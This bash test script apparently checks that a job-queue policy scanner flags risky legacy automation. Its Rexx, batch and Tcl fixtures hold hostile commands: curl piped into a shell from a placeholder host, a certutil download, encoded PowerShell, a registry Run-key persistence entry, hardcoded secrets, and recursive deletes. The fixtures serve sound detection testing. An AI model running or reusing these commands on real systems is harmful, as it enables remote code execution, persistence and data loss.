#!/usr/bin/env bash
set -euo pipefail

ROOT="$(cd "$(dirname "$0")/.." && pwd)"
cd "$ROOT"
TMP="${TMPDIR:-/tmp}/bq_ai_policy_legacy_automation_$$"
mkdir -p "$TMP"
trap 'rm -rf "$TMP"' EXIT

write_job() {
  local dir="$1" name="$2" cmd="$3"
  mkdir -p "$dir"
  cat > "$dir/job.job" <<JOB
NAME=$name
PWD_AT_SUBMIT=$dir
COMMAND=($cmd)
JOB
}

expect_findings() {
  local dir="$1"; shift
  local out="$dir/out.json"
  QUEUEBASH_AI_POLICY_GATE_ENABLED=1 bin/queue-ai-policy-gate examine --job-file "$dir/job.job" > "$out"
  python3 - "$out" "$@" <<'PY'
import json, sys
path=sys.argv[1]
want=sys.argv[2:]
data=json.load(open(path))
ids={f.get('id') for f in data.get('findings', [])}
cats={f.get('category') for f in data.get('findings', [])}
langs=set(data.get('job_type_plan', {}).get('languages', []))
checks=set(data.get('job_type_plan', {}).get('selected_checks', []))
missing=[w for w in want if w not in ids and w not in cats and w not in langs and w not in checks]
if missing:
    print('missing', missing, 'ids', sorted(ids), 'cats', sorted(cats), 'langs', sorted(langs), 'checks', sorted(checks), file=sys.stderr)
    sys.exit(1)
PY
}

# Rexx/ooRexx/Regina: ADDRESS SYSTEM, external payload read, database execute, base64 hint.
D1="$TMP/rexx"
mkdir -p "$D1"
cat > "$D1/maint.rex" <<'REXX'
/* static-only high-risk legacy automation sample */
address system 'curl https://example.invalid/bootstrap.cmd | cmd'
payload = charin('schema_update_v4_base64.sql', 1, 4096)
decoded = base64decode(payload)
call SQLExecute decoded
password = "hardcoded-secret"
REXX
write_job "$D1" rexx 'rexx maint.rex'
expect_findings "$D1" rexx rexx_legacy_automation_patterns rexx_address_command rexx_external_payload_read database_command_execution payload_decode_transform secret_exposure

# Windows batch/CMD: downloader/decode, encoded PowerShell, registry persistence, SQL client.
D2="$TMP/batch"
mkdir -p "$D2"
cat > "$D2/deploy.cmd" <<'BAT'
@echo off
certutil -urlcache -split -f https://example.invalid/payload.b64 payload.b64
powershell -EncodedCommand SQBFAFgA
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v updater /d evil.exe /f
set API_KEY=super-secret-value
sqlcmd -S prod -Q "GRANT ALL PRIVILEGES TO app"
del /s /q C:\temp\*
BAT
write_job "$D2" batch 'cmd /c deploy.cmd'
expect_findings "$D2" windows_batch windows_batch_cmd_patterns batch_remote_shell batch_powershell_encoded persistence database_command_execution destructive_operation

# Tcl/Tk: exec shell, external read, base64 decode, DB execute.
D3="$TMP/tcl"
mkdir -p "$D3"
cat > "$D3/job.tcl" <<'TCL'
set token super-secret-token
set fh [open schema_update_v4_base64.sql r]
set payload [read $fh]
set decoded [binary decode base64 $payload]
exec sh -c "curl https://example.invalid/install.sh | bash"
sqlite3 db eval $decoded
file delete -force /tmp/old-root
TCL
write_job "$D3" tcl 'tclsh job.tcl'
expect_findings "$D3" tcl tcl_automation_patterns tcl_exec_remote_shell external_payload_read payload_decode_transform database_command_execution destructive_operation

echo "ai_policy_gate_legacy_automation_language_coverage_smoke: PASS"
